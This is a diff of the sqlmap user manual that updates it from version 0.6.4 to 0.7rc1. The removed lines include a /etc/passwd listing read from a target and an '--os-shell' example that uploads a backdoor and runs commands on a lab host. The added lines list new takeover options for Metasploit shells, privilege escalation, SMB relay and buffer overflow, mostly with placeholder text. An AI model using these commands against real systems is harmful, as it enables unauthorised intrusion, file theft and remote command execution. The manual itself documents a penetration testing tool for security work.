-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/false
-backup:x:34:34:backup:/var/backups:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-mysql:x:104:105:MySQL Server,,,:/var/lib/mysql:/bin/false
-postgres:x:105:107:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
-inquis:x:1000:100:Bernardo Damele A. G.,,,:/home/inquis:/bin/bash
----
-</verb></tscreen>
+<p>
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
 
 
 <sect1>Operating system access
+
+<sect2>Execute an operating system command
+
+<p>
+Option: <tt>--os-cmd</tt>
+
+<p>
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
 
 <sect2>Prompt for an interactive operating system shell
 
@@ -3784,34 +3873,34 @@ inquis:x:1000:100:Bernardo Damele A. G.,,,:/home/inquis:/bin/bash
 Option: <tt>--os-shell</tt>
 
 <p>
-If the back-end database management system is MySQL, the web application's
-programming language is PHP and you, or sqlmap itself, found a writable
-directory within the web server document root path, sqlmap can prompt for
-an interactive operating system shell on the back-end database management
-system.
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
+
+<sect2>Prompt for an out-of-band shell, meterpreter or VNC
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
-  --os-shell -v 0
-
-[hh:mm:49] [WARNING] unable to retrieve the injectable file absolute system path
-[hh:mm:49] [WARNING] unable to retrieve the remote web server document root
-[hh:mm:49] [INPUT] please provide the web server document root [/var/www]: 
-[hh:mm:53] [INPUT] please provide a list of directories absolute path comma separated that 
-you want sqlmap to try to upload the agent [/var/www/test]: 
-[hh:mm:55] [INPUT] do you want to use the uploaded backdoor as a shell to execute commands 
-right now? [Y/n] y
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ exit
-</verb></tscreen>
+Options: <tt>--os-pwn</tt>, <tt>--priv-esc</tt>, <tt>--msf-path</tt> and <tt>--tmp-path</tt>
 
 <p>
-As you might notice, such operating system shell has the same
-functionalities of SQL shell in terms of TAB completion and history support.
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
+
+<sect2>One click prompt for an out-of-band shell, meterpreter or VNC
+
+<p>
+Options: <tt>--os-smbrelay</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
+
+<p>
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
+
+<sect2>Stored procedure buffer overflow exploitation
+
+<p>
+Options: <tt>--os-bof</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
+
+<p>
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
 
 
 <sect1>Miscellaneous
@@ -3925,7 +4014,7 @@ $ python sqlmap.py --update -v 4
 [hh:mm:55] [TRAFFIC OUT] HTTP request:
 GET /doc/VERSION HTTP/1.1
 Host: sqlmap.sourceforge.net
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:55] [TRAFFIC IN] HTTP response (OK - 200):
@@ -3944,7 +4033,7 @@ X-Pad: avoid browser bug
 [hh:mm:56] [TRAFFIC OUT] HTTP request:
 GET /FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx HTTP/1.1
 Host: www.sqlsecurity.com
-User-agent: sqlmap/0.6.4 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
 Cookie: .ASPXANONYMOUS=dvus03cqyQEkAAAANDI0M2QzZmUtOGRkOS00ZDQxLThhMTUtN2ExMWJiNWVjN2My0; 
 language=en-US
 Connection: close
@@ -4104,7 +4193,6 @@ INI file, <tt>sqlmap-SAUbs.conf</tt>.
 
 <tscreen><verb>
 $ cat sqlmap-SAUbs.conf
-
 [Target]
 url = http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1
 googledork = 
@@ -4119,7 +4207,7 @@ delay = 0
 headers = 
 cookie = 
 proxy = 
-timeout = 10
+timeout = 30
 acred = 
 referer = 
 data = 
@@ -4127,10 +4215,11 @@ method = GET
 
 [Miscellaneous]
 updateall = False
-eta = False
-verbose = 2
-batch = False
 sessionfile = 
+eta = False
+batch = False
+cleanup = False
+verbose = 1
 
 [Enumeration]
 dumpall = False
@@ -4156,24 +4245,33 @@ getcurrentuser = False
 getbanner = True
 
 [File system]
+dfile = 
 wfile = 
 rfile = 
 
 [Takeover]
+msfpath = 
 osshell = False
+ossmb = False
+privesc = False
+ospwn = False
+tmppath = 
+oscmd = 
+osbof = False
 
 [Fingerprint]
 extensivefp = False
 
 [Injection]
-estring = 
 dbms = 
 string = 
 postfix = 
+regexp = 
 prefix = 
 testparameter = 
-regexp = 
+estring = 
 eregexp = 
+os = 
 
 [Techniques]
 stackedtest = False
@@ -4248,6 +4346,15 @@ As you can see, sqlmap choosed automatically to injection on the first
 vulnerable parameter which is the default behaviour.
 
 
+<sect2>Clean up the DBMS by sqlmap specific UDF and tables
+
+<p>
+Option: <tt>--cleanup</tt>
+
+<p>
+This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+
+
 <sect>Disclaimer
 
 <p>
@@ -4263,13 +4370,11 @@ that such action might get you in trouble with a lot of law enforcement
 agencies.
 
 
-<sect>Authors
+<sect>Author
 
 <p>
-<itemize>
-<item><htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G."> (inquis) - project leader, core developer. PGP Key ID: <htmlurl url="http://pgp.mit.edu:11371/pks/lookup?op=get&amp;search=0x05F5A30F" name="0x05F5A30F">
-<item><htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci"> (belch) - project founder, initial developer. PGP Key ID: <htmlurl url="http://pgp.mit.edu:11371/pks/lookup?op=get&amp;search=0x9A0E8190" name="0x9A0E8190">
-</itemize>
+<htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G."> (inquis) - Lead developer.
+PGP Key ID: <htmlurl url="http://pgp.mit.edu:11371/pks/lookup?op=get&amp;search=0x05F5A30F" name="0x05F5A30F">
 
 
 </article>
